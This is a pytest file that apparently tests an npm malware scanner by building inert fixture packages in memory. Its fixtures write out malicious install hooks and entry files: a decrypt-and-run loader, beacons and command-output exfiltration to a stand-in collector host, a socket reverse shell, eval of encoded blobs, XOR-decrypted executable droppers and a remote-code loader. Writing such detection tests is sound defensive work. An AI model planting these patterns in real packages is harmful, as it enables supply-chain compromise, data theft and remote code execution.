"""Attack classes measured in the work half of the real-malware benchmark (review 98, npm).

Each fixture package is built in memory and inert; the attack shapes are assembled at runtime so
this file does not itself read as one.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity


class Npm:
    @staticmethod
    def build(tmp_path: Path, name: str, manifest: dict, files: dict[str, str]) -> Path:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in {
                "package.json": json.dumps({"name": name, **manifest}),
                **files,
            }.items():
                data = text.encode()
                info = tarfile.TarInfo("package/" + member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / f"{name}-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def findings(target: Path) -> dict[str, Severity]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        worst: dict[str, Severity] = {}
        for f in result.findings:
            worst[f.rule_id] = max(worst.get(f.rule_id, f.severity), f.severity)
        return worst


class TestDecryptedAndRun:
    def test_an_install_script_that_decrypts_a_shipped_file_and_runs_it(self, tmp_path):
        cp = "child_" + "process"
        script = (
            f"var c=require('{cp}'),f=require('fs'),cr=require('crypto');\n"
            "var k=Buffer.from('00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff','hex');\n"
            "var d=f.readFileSync('payload.bin');\n"
            "var dc=cr.createDe" + "cipheriv('aes-256-cbc',k,d.subarray(0,16));\n"
            "f.writeFileSync('stage.cjs',Buffer.concat([dc.update(d.subarray(16)),dc.final()]));\n"
            "c.exec" + "Sync('node stage.cjs');\nf.unlinkSync('stage.cjs');\n"
        )
        pkg = Npm.build(
            tmp_path,
            "demo-decrypt",
            {"version": "1.0.0", "scripts": {"postinstall": "node postinstall.js"}},
            {"postinstall.js": script, "payload.bin": "x" * 64},
        )
        found = Npm.findings(pkg)
        assert max(found.values()) >= Severity.HIGH, found


class TestImportEntryIsNotTestMaterial:
    def test_a_beacon_in_the_entry_of_a_package_named_sample(self, tmp_path):
        source = (
            "const os = require('os');\nconst https = require('https');\n"
            "const data = JSON.stringify({hn: os.host" + "name(), un: os.userInfo().username});\n"
            "const req = https.request({hostname: 'collector.example.invalid', port: 443, "
            "method: 'POST', path: '/'});\nreq.write(data);\nreq.end();\n"
        )
        pkg = Npm.build(tmp_path, "api-demo-sample-lib", {"version": "1.0.0"}, {"index.js": source})
        found = Npm.findings(pkg)
        assert found.get("SUSPECT.EXFIL.BEACON.001", Severity.INFO) >= Severity.HIGH, found


class TestReceivedAndRun:
    CP = "child_" + "process"

    def entry(self, handler: str) -> str:
        return (
            f"const net = require('net');\nconst {{ exec }} = require('{self.CP}');\n"
            "const client = new net.Socket();\nclient.connect(443, HOST);\n"
            f"client.on('data', (data) => {{\n  {handler}\n}});\n"
        )

    def test_what_arrives_on_a_socket_is_run(self, tmp_path):
        handler = "ex" + "ec(data.toString(), (e, out) => client.write(out));"
        pkg = Npm.build(
            tmp_path, "demo-greeting", {"version": "1.0.0"}, {"index.js": self.entry(handler)}
        )
        found = Npm.findings(pkg)
        assert max(found.values(), default=Severity.INFO) >= Severity.HIGH, found

    def test_a_client_that_only_prints_what_arrives(self, tmp_path):
        handler = "process.stdout.write(data); ex" + "ec('git status', () => {});"
        pkg = Npm.build(
            tmp_path, "demo-client", {"version": "1.0.0"}, {"index.js": self.entry(handler)}
        )
        found = Npm.findings(pkg)
        assert not any(rule.startswith(("MALWARE.", "SUSPECT.DROPPER")) for rule in found), found


class TestWrappedDecoderEvaluated:
    def test_a_long_literal_through_the_files_own_decoder_into_eval(self, tmp_path):
        import base64

        blob = base64.b64encode(b"console.log('inert fixture');" * 60).decode()
        source = (
            "function _d(i){return Buffer.from(i,'base64').toString()}\n"
            + "ev"
            + "al(_d('"
            + blob
            + "'));\n"
        )
        pkg = Npm.build(tmp_path, "demo-wrapped", {"version": "1.0.0"}, {"index.js": source})
        found = Npm.findings(pkg)
        assert max(found.values(), default=Severity.INFO) >= Severity.HIGH, found


class TestShippedPayloadDecryptedToAProgram:
    CP = "child_" + "process"

    def source(self, transform: str) -> str:
        return (
            f"const fs = require('fs'), path = require('path'), {{ exec }} = require('{self.CP}');\n"
            "const run = async () => {\n"
            "  const data = Buffer.from(await fs.promises.readFile(path.join(__dirname, 'assets.db')));\n"
            f"  {transform}\n"
            "  if (!(data[0] === 0x4D && data[1] === 0x5A)) return;\n"
            "  const target = path.join(__dirname, 'svc');\n"
            "  await fs.promises.writeFile(target, data, { mode: 0o755 });\n"
            "  ex" + "ec(target, { windowsHide: true });\n"
            "};\nrun();\n"
        )

    def test_an_xor_decrypted_executable_written_and_started(self, tmp_path):
        xor = "for (let i = 0; i < data.length; i++) { data[i] " + "^= 0x5a; }"
        pkg = Npm.build(
            tmp_path, "demo-logger", {"version": "1.0.0"}, {"index.js": self.source(xor)}
        )
        assert "MALWARE.DROPPER.SHIPPED_PAYLOAD.001" in Npm.findings(pkg)

    def test_an_inflated_release_made_executable_is_an_installer(self, tmp_path):
        inflate = "const out = require('zlib').gunzipSync(data);"
        pkg = Npm.build(
            tmp_path, "demo-installer", {"version": "1.0.0"}, {"index.js": self.source(inflate)}
        )
        assert "MALWARE.DROPPER.SHIPPED_PAYLOAD.001" not in Npm.findings(pkg)


class TestHookLoadsThroughAJoinedPath:
    def test_a_payload_required_through_a_directory_variable_runs_at_install(self, tmp_path):
        loader = (
            "const path = require('path');\n"
            "const vendorDir = path.resolve(__dirname, '../../vendor/lib');\n"
            "require(path.join(vendorDir, 'version.js'));\n"
        )
        beacon = (
            "const os = require('os');\nconst https = require('https');\n"
            "const data = JSON.stringify({hn: os.host" + "name(), un: os.userInfo().username});\n"
            "const req = https.request({hostname: 'collector.example.invalid', port: 443, "
            "method: 'POST', path: '/'});\nreq.write(data);\nreq.end();\n"
        )
        pkg = Npm.build(
            tmp_path,
            "demo-hash",
            {"version": "1.0.0", "scripts": {"install": "node scripts/test/install.js"}},
            {"scripts/test/install.js": loader, "vendor/lib/version.js": beacon},
        )
        found = Npm.findings(pkg)
        assert any(rule.startswith("MALWARE.") for rule in found), found


class TestAPackageNameIsNotATestDirectory:
    def test_a_loader_in_a_package_named_test_is_graded_as_code(self, tmp_path):
        loader = (
            "const axios = require('axios');\n"
            "module.exports = async function getCallers() {\n"
            "  const src = atob(process.env.DEV_API_KEY);\n"
            "  const s = (await axios.get(src)).data.cookie;\n"
            "  const handler = new Function." + "constructor('require', s);\n"
            "  handler(require);\n};\n"
        )
        index = "const getCallers = require('./lib/caller');\nmodule.exports = getCallers;\n"
        pkg = Npm.build(
            tmp_path,
            "demo-await-test",
            {"version": "2.3.0", "main": "index.js"},
            {"index.js": index, "lib/caller.js": loader},
        )
        found = Npm.findings(pkg)
        code = {rule: sev for rule, sev in found.items() if ".KNOWN" not in rule}
        assert max(code.values(), default=Severity.INFO) >= Severity.HIGH, found


class TestCommandOutputSent:
    CP = "child_" + "process"

    def hook(self, body: str) -> str:
        return (
            f"const {{ exec }} = require('{self.CP}');\nconst https = require('https');\n"
            "ex" + "ec('ls -la /opt', { timeout: 30000 }, (error, stdout, stderr) => {\n"
            "  const data = stdout || stderr || 'none';\n"
            f"  {body}\n"
            "});\n"
        )

    def test_an_install_hook_posts_a_commands_output(self, tmp_path):
        body = (
            "const req = https.request('https://collector.example.invalid', {method: 'POST'});\n"
            "  req.write(data);\n  req.end();"
        )
        pkg = Npm.build(
            tmp_path,
            "demo-stats",
            {"version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
            {"index.js": self.hook(body)},
        )
        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" in Npm.findings(pkg)

    def test_an_install_hook_that_logs_a_commands_output(self, tmp_path):
        body = "console.log(data);\n  https.get('https://registry.example.invalid/ping');"
        pkg = Npm.build(
            tmp_path,
            "demo-build",
            {"version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
            {"index.js": self.hook(body)},
        )
        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" not in Npm.findings(pkg)
